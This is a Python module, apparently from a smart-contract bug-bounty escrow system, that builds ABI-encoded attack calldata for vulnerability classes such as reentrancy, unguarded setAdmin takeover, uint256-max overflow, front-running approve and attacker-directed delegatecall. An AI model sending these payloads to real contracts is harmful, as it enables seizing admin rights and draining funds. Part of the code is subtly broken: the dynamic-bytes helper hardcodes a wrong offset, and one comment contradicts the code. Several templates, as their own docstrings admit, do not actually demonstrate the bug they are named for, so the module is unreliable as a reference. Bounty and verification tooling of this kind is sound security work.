"""
PoC (Proof of Concept) generator for common smart contract vulnerability classes.

Each template produces a raw ABI-encoded transaction payload that can be
submitted to BountyPool.submitFinding() as the `pocData` argument.

Templates are intentionally minimal — they encode the attack call, not a full
exploit contract — because the escrow verifier simulates them via eth_call with
state override, not by deploying a new contract.
"""

from web3 import Web3

# ABI encoder instance (no provider needed — used for encoding only)
_w3 = Web3()


class PoCValidator:

    def generate_poc(self, vulnerability_type: str, contract_info: dict) -> str:
        """
        Generate an ABI-encoded PoC payload for the given vulnerability type.

        Args:
            vulnerability_type: One of the VULN_* constants below.
            contract_info: Dict with keys: abi (list), address (str), and
                           any finding-specific extras (e.g. function_name,
                           amount, attacker_address).

        Returns:
            Hex string (0x-prefixed) representing the encoded call data,
            or '0x' if no template matches.
        """
        vtype = vulnerability_type.lower().replace("-", "_").replace(" ", "_")
        generator = self._TEMPLATES.get(vtype)
        if generator is None:
            return "0x"
        try:
            return generator(self, contract_info)
        except Exception:
            return "0x"

    # ------------------------------------------------------------------
    # Templates
    # ------------------------------------------------------------------

    def _poc_reentrancy(self, info: dict) -> str:
        """
        Encodes a call to `withdraw()` (or the function named in info).
        The escrow verifier checks whether the caller balance changed after
        the call — a real reentrancy PoC would require a malicious contract,
        but the encoded selector is enough to flag the issue.
        """
        fn_name = info.get("function_name", "withdraw")
        selector = _selector(fn_name, [])
        # Optionally encode an amount argument
        amount = info.get("amount")
        if amount is not None:
            payload = selector + _encode_uint256(int(amount))
        else:
            payload = selector
        return "0x" + payload.hex()

    def _poc_access_control(self, info: dict) -> str:
        """
        Encodes a call to the unguarded admin function (e.g. setAdmin, pause).
        attacker_address is the address that should gain admin rights.
        """
        fn_name = info.get("function_name", "setAdmin")
        attacker = info.get("attacker_address", "0x" + "aa" * 20)
        selector = _selector(fn_name, ["address"])
        payload = selector + _encode_address(attacker)
        return "0x" + payload.hex()

    def _poc_integer_overflow(self, info: dict) -> str:
        """
        Encodes a call with uint256 max to trigger overflow in pre-0.8 code.
        """
        fn_name = info.get("function_name", "transfer")
        selector = _selector(fn_name, ["address", "uint256"])
        attacker = info.get("attacker_address", "0x" + "aa" * 20)
        uint256_max = 2**256 - 1
        payload = selector + _encode_address(attacker) + _encode_uint256(uint256_max)
        return "0x" + payload.hex()

    def _poc_unchecked_return(self, info: dict) -> str:
        """
        Encodes a transfer call where the return value is unchecked.
        """
        fn_name = info.get("function_name", "transfer")
        to = info.get("attacker_address", "0x" + "aa" * 20)
        amount = info.get("amount", 1)
        selector = _selector(fn_name, ["address", "uint256"])
        payload = selector + _encode_address(to) + _encode_uint256(int(amount))
        return "0x" + payload.hex()

    def _poc_front_running(self, info: dict) -> str:
        """
        Encodes an approve() call to demonstrate the front-running race.
        """
        fn_name = info.get("function_name", "approve")
        spender = info.get("attacker_address", "0x" + "aa" * 20)
        amount = info.get("amount", 10**18)
        selector = _selector(fn_name, ["address", "uint256"])
        payload = selector + _encode_address(spender) + _encode_uint256(int(amount))
        return "0x" + payload.hex()

    def _poc_delegatecall(self, info: dict) -> str:
        """
        Encodes a call to the execute() function pointing at an attacker address.
        """
        fn_name = info.get("function_name", "execute")
        attacker = info.get("attacker_address", "0x" + "aa" * 20)
        # encode (address, bytes): target + empty calldata
        selector = _selector(fn_name, ["address", "bytes"])
        payload = (
            selector
            + _encode_address(attacker)
            + _encode_bytes_dynamic(b"")
        )
        return "0x" + payload.hex()

    def _poc_timestamp_dependence(self, info: dict) -> str:
        """Encodes a call to the time-gated function."""
        fn_name = info.get("function_name", "claim")
        selector = _selector(fn_name, [])
        return "0x" + selector.hex()

    def _poc_denial_of_service(self, info: dict) -> str:
        """Encodes a call that triggers the unbounded loop."""
        fn_name = info.get("function_name", "distribute")
        selector = _selector(fn_name, [])
        return "0x" + selector.hex()

    # Maps normalised vulnerability type strings to generator methods
    _TEMPLATES: dict = {}


# Populate _TEMPLATES after class definition so methods are bound
PoCValidator._TEMPLATES = {
    "reentrancy":               PoCValidator._poc_reentrancy,
    "access_control":           PoCValidator._poc_access_control,
    "missing_access_control":   PoCValidator._poc_access_control,
    "integer_overflow":         PoCValidator._poc_integer_overflow,
    "arithmetic_overflow":      PoCValidator._poc_integer_overflow,
    "unchecked_return_value":   PoCValidator._poc_unchecked_return,
    "unchecked_return":         PoCValidator._poc_unchecked_return,
    "front_running":            PoCValidator._poc_front_running,
    "frontrunning":             PoCValidator._poc_front_running,
    "delegatecall":             PoCValidator._poc_delegatecall,
    "timestamp_dependence":     PoCValidator._poc_timestamp_dependence,
    "timestamp":                PoCValidator._poc_timestamp_dependence,
    "denial_of_service":        PoCValidator._poc_denial_of_service,
    "dos":                      PoCValidator._poc_denial_of_service,
}


# ------------------------------------------------------------------
# ABI encoding helpers (no web3 dependency for simple cases)
# ------------------------------------------------------------------

def _selector(fn_name: str, arg_types: list[str]) -> bytes:
    sig = f"{fn_name}({','.join(arg_types)})"
    return Web3.keccak(text=sig)[:4]


def _encode_uint256(value: int) -> bytes:
    return value.to_bytes(32, "big")


def _encode_address(addr: str) -> bytes:
    # Left-pad the 20-byte address to 32 bytes
    raw = bytes.fromhex(addr.removeprefix("0x"))
    return raw.rjust(32, b"\x00")


def _encode_bytes_dynamic(data: bytes) -> bytes:
    # ABI dynamic bytes: offset (32) + length (32) + data (padded to 32)
    offset = (32).to_bytes(32, "big")
    length = len(data).to_bytes(32, "big")
    padded = data + b"\x00" * ((32 - len(data) % 32) % 32)
    return offset + length + padded
